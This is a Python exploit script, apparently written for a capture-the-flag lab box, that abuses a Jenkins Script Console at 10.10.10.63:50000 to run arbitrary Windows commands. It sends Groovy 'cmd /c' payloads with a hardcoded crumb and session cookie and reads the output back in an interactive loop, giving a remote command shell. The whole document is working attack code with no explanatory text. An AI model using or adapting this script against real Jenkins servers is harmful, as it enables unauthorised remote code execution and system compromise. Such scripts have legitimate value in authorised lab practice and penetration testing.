import requests

TARGET = 'http://10.10.10.63:50000'
URI = '/askjeeves/script'
HEADERS = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Referer': 'http://10.10.10.63:50000/askjeeves/script'
}
BODY = '''def+sout+%3D+new+StringBuffer%28%29%2C+serr+%3D+new+StringBuffer%28%29%0D%0Adef+proc+%3D+%27cmd+%2Fc+#COMMAND#%27.execute%28%29%0D%0Aproc.consumeProcessOutput%28sout%2C+serr%29%0D%0Aproc.waitForOrKill%281000%29%0D%0Aprintln+%22out%3E+%24sout+err%3E+%24serr%22&Jenkins-Crumb=bc4f7b806059dd65cbe61482e98071b0&json=%7B%22script%22%3A+%22def+sout+%3D+new+StringBuffer%28%29%2C+serr+%3D+new+StringBuffer%28%29%5Cndef+proc+%3D+%27cmd+%2Fc+dir%27.execute%28%29%5Cnproc.consumeProcessOutput%28sout%2C+serr%29%5Cnproc.waitForOrKill%281000%29%5Cnprintln+%5C%22out%3E+%24sout+err%3E+%24serr%5C%22%22%2C+%22%22%3A+%22%22%2C+%22Jenkins-Crumb%22%3A+%22bc4f7b806059dd65cbe61482e98071b0%22%7D&Submit=Run'''

request_template = '''POST /askjeeves/script HTTP/1.1
Host: 10.10.10.63:50000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.63:50000/askjeeves/script
Cookie: screenResolution=2208x1278; JSESSIONID.6fd2bc68=node0ui7r6j814dn91f88dkvig2yly1.node0
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 688

script=def+sout+%3D+new+StringBuffer%28%29%2C+serr+%3D+new+StringBuffer%28%29%0D%0Adef+proc+%3D+%27cmd+%2Fc+#COMMAND#%27.execute%28%29%0D%0Aproc.consumeProcessOutput%28sout%2C+serr%29%0D%0Aproc.waitForOrKill%281000%29%0D%0Aprintln+%22out%3E+%24sout+err%3E+%24serr%22&Jenkins-Crumb=bc4f7b806059dd65cbe61482e98071b0&json=%7B%22script%22%3A+%22def+sout+%3D+new+StringBuffer%28%29%2C+serr+%3D+new+StringBuffer%28%29%5Cndef+proc+%3D+%27cmd+%2Fc+dir%27.execute%28%29%5Cnproc.consumeProcessOutput%28sout%2C+serr%29%5Cnproc.waitForOrKill%281000%29%5Cnprintln+%5C%22out%3E+%24sout+err%3E+%24serr%5C%22%22%2C+%22%22%3A+%22%22%2C+%22Jenkins-Crumb%22%3A+%22bc4f7b806059dd65cbe61482e98071b0%22%7D&Submit=Run
'''

def BuildRequest(command):
    payload = {
        'script': '''def sout = new StringBuffer(), serr = new StringBuffer()
def proc = 'cmd /c #COMMAND#'.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out> $sout err> $serr"'''.replace('#COMMAND#', command),
        'Jenkins-Crumb': 'bc4f7b806059dd65cbe61482e98071b0',
        'json': """{"script": "def sout = new StringBuffer(), serr = new StringBuffer()\ndef proc = 'cmd /c #COMMAND#'.execute()\nproc.consumeProcessOutput(sout, serr)\nproc.waitForOrKill(1000)\nprintln \"out> $sout err> $serr\"", "": "", "Jenkins-Crumb": "bc4f7b806059dd65cbe61482e98071b0"}""".replace('#COMMAND#', command),
        'Submit': 'Run'
    }
    return payload


def ExecuteCommand(command):
    payload = BuildRequest(command)
    uri = TARGET + URI
    result = requests.post(uri, payload, timeout=5, proxies={'http': 'http://127.0.0.1:8080'}).text.strip()
    start = result.find('Result</h2><pre>out>') + 20
    end = result.find('err>', start)
    return result[start:end]

if __name__ == '__main__':
    while True:
        command = input('> ')
        result = ExecuteCommand(command)
        print(result)